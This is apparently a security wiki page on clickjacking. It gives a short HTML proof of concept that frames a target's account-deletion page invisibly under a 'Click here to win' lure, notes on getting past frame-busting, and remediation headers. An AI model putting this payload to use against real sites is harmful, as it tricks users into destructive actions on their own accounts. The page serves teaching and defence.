---
tags:
  - Web
---

# :material-cursor-default-click: Clickjacking

<span class="pill pill-easy">low sev</span> <span class="pill pill-info">web</span>

Frame the target invisibly over your own decoy UI so the victim's clicks land on *their* buttons — confirming a transfer, changing a setting, deleting an account.

!!! abstract "TL;DR"
    If the target page has no `X-Frame-Options` / `frame-ancestors`, iframe it, make it transparent, and align a lure under the sensitive button.

## :material-file-code: PoC

```html
<style>
  iframe { position:absolute; opacity:0.0001; width:800px; height:600px; }
  .lure  { position:absolute; top:220px; left:60px; }
</style>
<div class="lure">Click here to win 🎁</div>
<iframe src="https://target.tld/account/delete"></iframe>
```

Tune `top/left` until the invisible "Delete" button sits under the lure.

## :material-gesture-tap: Advanced

- **Drag-and-drop** to move data across frames.
- **Multi-step** framing to walk the victim through a wizard.
- Bypass frame-busting JS with the iframe `sandbox` attribute (blocks `top.location`).

## :material-shield-check: Remediation

- `Content-Security-Policy: frame-ancestors 'none'` (or an allowlist).
- Legacy `X-Frame-Options: DENY`; add `SameSite` cookies so framed requests aren't authenticated.

## :material-link-variant: Related

- Higher impact when combined with [CSRF](csrf.md) on the same action.
- Reference: [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking).
